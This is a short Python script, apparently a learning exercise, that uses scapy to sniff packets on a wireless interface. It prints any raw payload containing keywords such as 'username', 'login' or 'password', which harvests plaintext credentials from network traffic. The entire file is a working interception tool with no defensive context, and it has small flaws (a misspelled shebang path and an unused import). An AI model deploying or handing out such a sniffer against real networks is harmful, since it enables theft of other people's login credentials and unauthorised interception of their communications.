#!/user/bin/env python
from ast import keyword
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    # print(packet.show())
    if packet.haslayer(scapy.IP):
        #print(packet.show())
        if packet.haslayer(scapy.Raw):
            #print(packet[scapy.Raw].load)
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword.encode() in load:
                    print(load.decode())
                    break


sniff("wlan0")
